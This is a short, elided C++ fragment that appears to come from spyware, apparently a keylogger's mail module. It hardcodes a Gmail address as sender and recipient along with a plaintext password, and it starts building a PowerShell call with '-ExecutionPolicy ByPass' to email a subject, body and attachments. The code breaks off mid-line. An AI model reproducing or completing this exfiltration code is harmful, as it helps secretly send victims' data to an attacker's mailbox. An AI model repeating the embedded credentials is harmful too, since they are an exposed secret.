...
namespace Mail
{
#define X_EM_TO "buffdark310318@gmail.com"
#define X_EM_FROM "buffdark310318@gmail.com"
#define X_EM_PASS "princessbananahamock$"
...
#undef X_EM_PASS
    ...
    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        ...
        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" + StringReplace(subject, "\"", "\\\"") +
